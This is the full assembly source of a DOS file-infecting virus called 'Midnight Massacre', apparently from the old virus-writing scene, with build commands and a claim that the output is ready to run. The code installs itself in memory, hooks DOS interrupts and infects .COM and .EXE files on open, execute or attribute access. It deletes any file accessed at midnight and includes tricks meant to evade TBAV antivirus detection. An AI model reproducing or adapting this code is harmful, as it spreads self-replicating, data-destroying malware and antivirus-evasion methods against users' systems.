;****************************************************************************
;*                        Midnight Massacre virus                           *
;*                            by Crypt Keeper                               *
;****************************************************************************

;Version 1.2
;Entry point and check resident bugs fixed.

;Midnight Massacre is based on the Eleet! virus, but with added .COM
;support, bugs in infection process fixed, and new load resident and
;trigger routines.  The Midnight Massacre virus will infect .COM or
;.EXE files as they are opened, executed, or their attributes are
;accessed.  Also, if the system time is 12:00am, the virus will delete
;any file executed or opened for any reason (midnight massacre).
;Midnight Massacre also has a unique memory-resident installation
;routine that will load it into the UMB if a high memory driver is
;present, or 1000h paragraphs down from top of memory, if no HMA
;driver is loaded.  Midnight Massacre will not infect COMMAND.COM

;TASM MASSACRE.ASM /M3
;TLINK MASSACRE.OBJ /t
;The generated .COM file is ready to run with no modifications.

	.model tiny
	.code
	
	org 100h

massacre:                              ;start of virus code

vtop	equ	$                      ;top of virus code block

;Equates --------------------------------------------------------------------

vlength	equ	vbot-vtop              ;virus length in bytes
heapsiz	equ	hbot-heap              ;heap size in bytes
vlres	equ	((vlength+heapsiz+100h)/16)+1 ;virus length in paragraphs
vlpage	equ	(vlength/512)+1        ;virus length in pages
chkfunc	equ	9AC7h                  ;check resident int 21h function
virusid	equ	0000h                  ;virus ID word in exeheader

;----------------------------------------------------------------------------

	db	0BDh                   ;mov bp,
delta	dw	0                      ;delta offset

	lea sp,[bp+(offset(sspace)+64)]  ;set up new stack

	push ds
	push es                        ;save original EXE segments

	cld                            ;clear direction flag

	mov ax,chkfunc
	int 2Fh

	push cs
	pop ds

	cmp ax,chkfunc+1               ;did virus return reply?
	jne install                    ;if not, install resident
	
	jmp return                     ;if so, return to original program

install:
	mov ax,3521h                   ;Get int 21h vector
	int 21h

	mov [bp+offset(i21veco)],bx
	mov [bp+offset(i21vecs)],es

	mov ax,352Fh                   ;Get int 2Fh vector
	int 21h

	mov [bp+offset(i2Fveco)],bx
	mov [bp+offset(i2Fvecs)],es

	mov ax,4300h                   ;get himem.sys installed state
	int 2Fh                        ;multiplex interrupt

	cmp al,80h                     ;80h in al means himem.sys is loaded
	jne get_old_fashioned_way

	mov ax,4310h                   ;get himem.sys entry point adress
	int 2Fh

	mov [bp+offset(himem_o)],bx
	mov [bp+offset(himem_s)],es    ;save entry point for calling

	mov ah,10h                     ;allocate UMB (function 10h)
	mov dx,vlres                   ;paragraphs to request

	call dword ptr [bp+offset(himem_o)] ;call himem.sys
	mov ax,bx                      ;BX will contain segment of memory
	jmp short go_ahead_load        ;continue with load procedure

get_old_fashioned_way:
	int 12h                        ;get total k-bytes of RAM in conv. mem
	
	xor dx,dx
	mov cx,1024
	mul cx
	mov cx,16
	div cx                         ;convert to paragraphs

	sub ax,1000h                   ;put it 1000h paragraphs down from TOM

go_ahead_load:
	mov es,ax                      ;segment of allocated memory arena

	lea si,[bp+offset(massacre)]   ;bp=start of virus code
	mov cx,vlength+heapsiz         ;virus length in bytes+heap data
	mov di,100h

	rep movsb                      ;copy virus code up there

	push es
	pop ds

	mov dx,offset(i2Fvec)          ;new int 21h vector
	mov ax,252Fh                   ;set int 21h vector
	int 21h

	mov dx,offset(i21vec)          ;new int 21h vector
	mov ax,2521h                   ;set int 21h vector
	int 21h

return:	cmp byte ptr [bp+offset(comid)],0  ;is this a .COM file we're from?
	jne return_exe
	
	mov sp,0FFFEh                  ;set old stack pointer

	push cs
	pop ds
	push cs
	pop es

	lea si,[bp+offset(saved)]      ;saved bytes from original .COM
	mov di,100h
	push di                        ;set up for return

	mov cx,compend-cptop           ;size of branch code to replace

	rep movsb                      ;replace branch code

	ret                            ;jump back to top of code segment
return_exe:
	mov ah,51h                     ;Get PSP adress
	int 21h

	add bx,16                      ;Compensate for PSP size

	pop es
	pop ds                         ;Restore original ES and DS from EXE
	
	cli                            ;Clear interrupts for stack change

	mov sp,cs:[bp+offset(old_sp)]
	mov ax,cs:[bp+offset(old_ss)]
	add ax,bx                      ;Find segment for SS
	mov ss,ax                      ;Reset original EXE stack
	
	sti

	add cs:[bp+offset(old_cs)],bx  ;Find segment for CS

	jmp dword ptr cs:[bp+offset(old_ip)] ;Far jump to original EXE code

;----------------------------------------------------------------------------

i2Fvec:	cmp ax,chkfunc                 ;check resident function?
	je ret_reply                   ;if so, return a reply

	jmp dword ptr cs:i2Fveco
ret_reply:
	inc ax
	iret                           ;return with reply
	
;----------------------------------------------------------------------------

move_pointer_beginning:
	xor dx,dx
	xor cx,cx

	mov ax,4200h                   ;move file pointer to beginning of file
	jmp short function             ;execute DOS function call

move_pointer_end:
	xor cx,cx
	xor dx,dx                      ;move pointer 0 bytes
	
	mov ax,4202h                   ;move pointer to end of file
	;goes on to function procedure below
		
function:
	pushf
	call dword ptr cs:i21veco      ;simulate int 21h call
	ret

;Data -----------------------------------------------------------------------

message	db	'[MIDNIGHT MASSACRE] V1.2 by Crypt Keeper'

old_sp	dw	0
old_ss	dw	0FFF0h                 ;Old SS:SP
old_ip	dw	0
old_cs	dw	0FFF0h                 ;Old CS:IP

exeext	db	'EXE'
comext	db	'COM'                  ;Extensions to look for

comid	db	0                      ;set to 0 if .COM file by loader

cptop	equ	$                      ;start of COM file branch program
comproc:
	nop
	db	0BBh                   ;MOV BX,
voffset	dw	0                      ;virus jump offset
	push bx
	ret
compend	equ	$                      ;End of COM file branch program

saved	db	0CDh,20h               ;for proper return on gen #1 file
	db	(compend-cptop)-2 dup (0) ;saved .COM file bytes

;----------------------------------------------------------------------------

i21vec:	nop

	xchg ax,dx                     ;load into another register to fool
	                               ;TBAV's interception check flag

	cmp dx,4B00h                   ;load and execute program?
	je vtrigger

	cmp dx,4B01h                   ;load program?
	je vtrigger
	
	cmp dh,3Dh                     ;open file with handle?
	je vtrigger

	cmp dx,4301h                   ;set file attributes?
	je vtrigger

	cmp dx,4300h                   ;get file attributes?
	je vtrigger

	xchg ax,dx

	jmp dword ptr cs:i21veco
vtrigger:
	xchg ax,dx

	push es
	push si
	push di
	push ax
	push bx
	push cx
	push ds
	push dx

	mov ah,2Ch                     ;Get time
	int 21h

	pop dx
	push dx                        ;get old DX off stack

	cmp cx,0                       ;midnight?
	jne no_massacre                ;if not, skip the massacre

	mov ah,41h                     ;delete file
	int 21h
		
	jmp short exitvec              ;exit from interrupt

no_massacre:
	push ds
	pop es
	mov di,dx

	push cs
	pop ds

	cld                            ;clear direction flag
	mov cx,128                     ;maximum number of chars in a filename
	mov al,'.'                     ;search for extension seperator

	repne scasb                    ;find file extension
	
	cmp cx,0                       ;no extension found?
	je exitvec

	mov bx,di

upcase:	cmp byte ptr es:[di],97
	jb skip_change
	cmp byte ptr es:[di],122
	ja skip_change                 ;non-letters are not affected
	and byte ptr es:[di],5Fh       ;make character upper case
skip_change:
	inc di
	loop upcase

	mov di,bx

	mov si,offset(exeext)          ;extension to compare to
	mov cx,3                       ;3 bytes to compare

	repe cmpsb                     ;is the extension 'EXE'?

	cmp cx,0                       ;were they equal?
	je infect_exe                  ;if so, infect the .EXE file

	mov di,bx

	mov si,offset(comext)          ;extension to compare to
	mov cx,3                       ;3 bytes to compare

	repe cmpsb                     ;is the extension 'COM'?

	cmp cx,0                       ;were they equal?
	jne exitvec                    ;if not, terminate
	
	sub bx,3
	cmp word ptr es:[bx],'DN'      ;end with 'ND'?
	je exitvec

	jmp infect_com                 ;infect the .COM file
exitvec:
	pop dx
	pop ds
	pop cx
	pop bx
	pop ax
	pop di
	pop si
	pop es

	jmp dword ptr cs:i21veco       ;execute rest of interrupt chain

infect_exe:	
	pop dx
	push dx                        ;get adress of filename off stack
	call prepare_infect            ;prepare to infect

	mov cx,28                      ;size of EXE header + extra stuff
	mov dx,offset(exeheader)       ;EXE header data space

	mov ah,3Fh                     ;read file or device
	int 21h

	mov ax,exesign
	xor ax,0ABCDh                  ;kill TBAV's check exe/com flag
	cmp ax,0E697h
	je exe_ok
	cmp ax,0F180h
	je exe_ok                      ;if EXE ID field is ok, go ahead

	jmp endinfection               ;If not good EXE, end infection

exe_ok:	cmp idword,virusid             ;virus already infected?
	jne not_infected               ;if not, proceed

	jmp endinfection

not_infected:
	les si,dword ptr ds:initip     ;get CS:IP from EXE header
	mov old_cs,es
	mov old_ip,si

	les si,dword ptr ds:initss     ;get SS:SP (reversed)
	mov old_ss,si
	mov old_sp,es

	call move_pointer_end          ;move file pointer to end of file

	mov cx,10h
	div cx                         ;convert to paragraphs

	push ax
	sub ax,headers                 ;subtract header size in paragraphs

	pop cx
	cmp ax,cx
	ja endinfection                ;If file too small, end infection

	mov initcs,ax
	mov initip,dx                  ;set initial CS:IP in exe header
	sub dx,100h
	mov delta,dx                   ;set delta offset in virus

	mov initss,ax
	mov idword,virusid             ;set initial SS:SP in exe header

	add minallc,vlres+1            ;add virus size to minimum memory

	mov comid,0FFh                 ;set COM-ID field to nonzero (not COM)

	mov cx,vlength                 ;number of bytes in virus
	mov dx,100h

	mov ah,40h                     ;write file or device
	int 21h

	call move_pointer_end          ;move file pointer to end of file
	
	mov cx,512
	div cx                         ;change bytes in new file to pages
	cmp dx,0                       ;no remainder?
	je go_ahead_set
	
	inc ax                         ;if remainder, add another page

go_ahead_set:
	mov expages,ax
	mov exbytes,dx                 ;set EXE file size

	call move_pointer_beginning    ;move pointer to beginning of file

	mov cx,28                      ;header size in bytes
	mov dx,offset(exeheader)       ;write exe header back out to file

	mov ah,40h                     ;write file or device
	call function

endinfection:
	mov cx,oldtime
	mov dx,olddate

	mov ax,5701h                   ;set file date and time
	int 21h

	mov ah,3Eh                     ;close file with handle
	int 21h

	pop dx
	pop ds                         ;get old location of filename

	mov cx,oldattr
	mov ax,4301h                   ;set file attributes
	call function

	jmp exitvec                    ;return from interrupt

prepare_infect:
	push es
	pop ds

	mov ax,4300h                   ;get file attributes
	call function

	jnc file_ok                    ;no carry means filename exists

	jmp exitvec

file_ok:
	pop ax                         ;preserve return vector

	push ds
	push dx

	push ax                        ;put return vector on top of stack

	mov cs:oldattr,cx              ;save old file attributes

	xor cx,cx                      ;set to normal attributes

	mov ax,4301h                   ;set file attributes
	call function

	mov ax,3D02h                   ;open file for read/write access
	call function

	mov bx,ax                      ;file handle
	push cs
	pop ds
	
	mov ax,5700h                   ;get file date and time
	int 21h

	mov oldtime,cx
	mov olddate,dx                 ;save old time and date
	ret

infect_com:
	pop dx
	push dx                        ;get adress of filename off stack
	call prepare_infect            ;open and prepare to infect

	mov cx,compend-cptop           ;size of .COM file branch code
	mov dx,offset(saved)           ;saved bytes buffer

	mov ah,3Fh                     ;read file or device
	int 21h
			
	mov ax,word ptr comproc
	cmp word ptr saved,ax          ;is file already infected?
	je endinfection

	mov comid,0                    ;zero .COM id field
	call move_pointer_end          ;move file pointer to EOF

	mov delta,ax                   ;delta offset
	add ax,100h
	mov voffset,ax                 ;offset of virus code in .COM file

	mov cx,vlength                 ;length of virus to write
	mov dx,100h

	mov ah,40h                     ;write file or device
	int 21h

	call move_pointer_beginning    ;move file pointer to start of file

	mov cx,compend-cptop           ;size of .COM file branch code
	mov dx,offset(comproc)         ;.COM file branch code to write

	mov ah,40h                     ;write file or device
	int 21h

	jmp endinfection               ;we're done.

;----------------------------------------------------------------------------

vbot	equ	$                      ;bottom of virus code
heap	equ	$                      ;Beginning of heap

himem_o	dw	0
himem_s	dw	0                      ;himem.sys entry point adress

i21veco	dw	0
i21vecs	dw	0                      ;int 21h vector

exeheader:
exesign	dw	0                      ;EXE signature
exbytes	dw	0                      ;number of bytes in last page
expages	dw	0                      ;number of pages in file
reloci	dw	0                      ;number of items in relocation table
headers	dw	0                      ;size of header in paragraphs
minallc	dw	0                      ;minimum memory to be allocated
maxallc	dw	0                      ;maximum memory to be allocated
initss	dw	0                      ;initial SS value
idword	dw	0                      ;initial SP value (used as ID word)
chksum	dw	0                      ;complimented checksum
initip	dw	0                      ;initial IP value
initcs	dw	0                      ;initial CS value
reltabl	dw	0                      ;byte offset to relocation table
ovnum	dw	0                      ;overlay number

oldattr	dw	0                      ;old file attributes

oldtime	dw	0
olddate	dw	0                      ;old saved time and date

i2Fveco	dw	0
i2Fvecs	dw	0                      ;old INT 2Fh vectors

hbot	equ	$                      ;bottom of heap

sspace	db	64 dup ('+')           ;virus stack

end	massacre
